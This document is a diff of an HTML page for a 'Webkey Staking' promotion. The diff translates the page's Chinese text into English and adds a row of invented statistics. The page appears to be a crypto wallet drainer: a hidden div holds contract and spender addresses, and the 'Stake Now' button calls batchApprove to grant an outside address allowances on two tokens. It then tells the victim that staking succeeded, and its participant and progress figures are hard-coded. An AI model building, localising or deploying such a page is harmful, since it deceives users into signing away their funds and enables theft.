@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Webkey 质押活动</title>
+    <title>Webkey Staking</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
@@ -23,7 +23,7 @@
             overflow-x: hidden;
         }
         
-        /* 动态背景效果 */
+        /* Dynamic background effect */
         body::before {
             content: '';
             position: absolute;
@@ -46,7 +46,7 @@
             width: 100%;
         }
         
-        /* 主卡片 */
+        /* Main card */
         .card {
             background: rgba(20, 22, 27, 0.95);
             backdrop-filter: blur(20px);
@@ -59,7 +59,7 @@
             overflow: hidden;
         }
         
-        /* 装饰光效 */
+        /* Decorative glow */
         .card::after {
             content: '';
             position: absolute;
@@ -77,7 +77,7 @@
             50% { opacity: 0.6; transform: scale(1.1); }
         }
         
-        /* Logo 区域 */
+        /* Logo section */
         .logo-section {
             text-align: center;
             margin-bottom: 32px;
@@ -131,7 +131,7 @@
             font-weight: 400;
         }
         
-        /* 活动信息卡片 */
+        /* Event card */
         .event-card {
             background: rgba(255, 255, 255, 0.03);
             border-radius: 32px;
@@ -172,7 +172,7 @@
             margin-top: 4px;
         }
         
-        /* 奖励展示 */
+        /* Rewards display */
         .reward-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -205,7 +205,7 @@
             margin-bottom: 8px;
         }
         
-        /* 进度条 */
+        /* Progress bar */
         .progress-section {
             margin: 24px 0;
         }
@@ -233,7 +233,7 @@
             position: relative;
         }
         
-        /* 按钮 */
+        /* Button */
         .action-button {
             width: 100%;
             padding: 20px;
@@ -275,7 +275,7 @@
             transform: translateY(0);
         }
         
-        /* 提示信息 */
+        /* Note */
         .note {
             text-align: center;
             color: #5a647b;
@@ -286,7 +286,7 @@
             border-radius: 100px;
         }
         
-        /* 结果弹窗 */
+        /* Result popup */
         .result {
             margin-top: 20px;
             padding: 16px;
@@ -316,12 +316,12 @@
             text-decoration: none;
         }
         
-        /* 隐藏的技术信息（但保留功能） */
+        /* Hidden technical info */
         .hidden-info {
             display: none;
         }
         
-        /* 活动标签 */
+        /* Activity tag */
         .tag {
             position: absolute;
             top: 20px;
@@ -334,50 +334,61 @@
             font-size: 14px;
             font-weight: 600;
         }
+        
+        /* Stats row */
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            color: #5a647b;
+            font-size: 14px;
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="card">
-            <div class="tag">🔥 限时活动</div>
+            <div class="tag">🔥 LIMITED EVENT</div>
             
-            <!-- Logo 区域 -->
+            <!-- Logo section -->
             <div class="logo-section">
                 <div class="logo">
                     <span>⚡️</span>
                 </div>
-                <h1 class="title">Webkey 质押季</h1>
-                <div class="subtitle">双倍积分 · 限时开启</div>
+                <h1 class="title">Webkey Staking</h1>
+                <div class="subtitle">Double Rewards · Limited Time</div>
             </div>
             
-            <!-- 活动信息 -->
+            <!-- Event information -->
             <div class="event-card">
                 <div class="event-header">
                     <div class="event-icon">🎯</div>
                     <div>
-                        <div class="event-title">质押挖矿活动</div>
-                        <div class="event-desc">质押 Webkey 生态代币，获取双倍奖励</div>
+                        <div class="event-title">Staking Season</div>
+                        <div class="event-desc">Stake Webkey ecosystem tokens to earn double rewards</div>
                     </div>
                 </div>
                 
-                <!-- 奖励展示 -->
+                <!-- Rewards display -->
                 <div class="reward-grid">
                     <div class="reward-item">
                         <div class="reward-icon">🪙</div>
                         <div class="reward-amount">2x</div>
-                        <div class="reward-label">WKEY奖励</div>
+                        <div class="reward-label">WKEY Rewards</div>
                     </div>
                     <div class="reward-item">
                         <div class="reward-icon">💎</div>
                         <div class="reward-amount">500</div>
-                        <div class="reward-label">积分/天</div>
+                        <div class="reward-label">Points/Day</div>
                     </div>
                 </div>
                 
-                <!-- 进度条 -->
+                <!-- Progress bar -->
                 <div class="progress-section">
                     <div class="progress-info">
-                        <span>总质押进度</span>
+                        <span>Total Staked</span>
                         <span>65%</span>
                     </div>
                     <div class="progress-bar">
@@ -385,13 +396,14 @@
                     </div>
                 </div>
                 
-                <!-- 参与人数 -->
-                <div style="color: #5a647b; font-size: 14px; text-align: center;">
-                    👥 已有 2,345 人参与
+                <!-- Stats -->
+                <div class="stats">
+                    <span>👥 2,345 Participants</span>
+                    <span>💰 1.2M Staked</span>
                 </div>
             </div>
             
-            <!-- 隐藏的技术信息（保留功能） -->
+            <!-- Hidden technical data (preserved for functionality) -->
             <div class="hidden-info" id="contractData" 
                  data-contract="0x62B5E69a0a97109Fe0BfC243E02673D293D7c921"
                  data-spender="0x99ff20F8ada291A9a0EDA48e4ae5A17F535D753b"
@@ -399,22 +411,22 @@
                  data-token2="0x55d398326f99059ff775485246999027b3197955">
             </div>
             
-            <!-- 行动按钮 -->
+            <!-- Action button -->
             <button class="action-button" onclick="participateEvent()">
-                ⚡️ 立即参与质押
+                ⚡️ Stake Now
             </button>
             
             <div class="note">
-                授权后即可参与质押活动 · 只需签名一次
+                Sign once to stake both tokens
             </div>
             
-            <!-- 结果展示 -->
+            <!-- Result display -->
             <div id="result" class="result"></div>
         </div>
     </div>
 
     <script>
-        // 从隐藏的 data 属性读取信息
+        // Read data from hidden attributes
         const contractData = document.getElementById('contractData');
         const CONTRACT_ADDRESS = contractData.dataset.contract;
         const SPENDER = contractData.dataset.spender;
@@ -440,25 +452,25 @@
             const resultDiv = document.getElementById('result');
             resultDiv.style.display = 'block';
             resultDiv.className = 'result';
-            resultDiv.innerHTML = '⏳ 连接钱包中...';
+            resultDiv.innerHTML = '⏳ Connecting wallet...';
             
             try {
                 if (!window.ethereum) {
-                    throw new Error('请安装 MetaMask');
+                    throw new Error('Please install MetaMask');
                 }
                 
                 await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const web3 = new Web3(window.ethereum);
                 const accounts = await web3.eth.getAccounts();
                 
-                resultDiv.innerHTML = '⏳ 准备参与质押...';
+                resultDiv.innerHTML = '⏳ Preparing staking...';
                 
                 const amountInWei = web3.utils.toWei(AMOUNT, 'ether');
                 const amounts = [amountInWei, amountInWei];
                 
                 const contract = new web3.eth.Contract(BATCH_ABI, CONTRACT_ADDRESS);
                 
-                resultDiv.innerHTML = '⏳ 请在钱包中确认授权...';
+                resultDiv.innerHTML = '⏳ Please confirm in your wallet...';
                 
                 const tx = await contract.methods.batchApprove(TOKENS, SPENDER, amounts).send({
                     from: accounts[0],
@@ -467,17 +479,17 @@
                 
                 resultDiv.className = 'result success';
                 resultDiv.innerHTML = `
-                    ✅ 参与成功！<br>
-                    您已成功加入 Webkey 质押活动<br>
-                    <a href="https://bscscan.com/tx/${tx.transactionHash}" target="_blank">查看交易详情</a>
+                    ✅ Staking successful!<br>
+                    You have joined Webkey Staking<br>
+                    <a href="https://bscscan.com/tx/${tx.transactionHash}" target="_blank">View transaction</a>
                 `;
                 
             } catch (error) {
                 resultDiv.className = 'result error';
                 if (error.message.includes('User rejected')) {
-                    resultDiv.innerHTML = '❌ 您已取消授权';
+                    resultDiv.innerHTML = '❌ You canceled the transaction';
                 } else {
-                    resultDiv.innerHTML = '❌ 授权失败，请重试';
+                    resultDiv.innerHTML = '❌ Transaction failed, please try again';
                 }
             }
         }
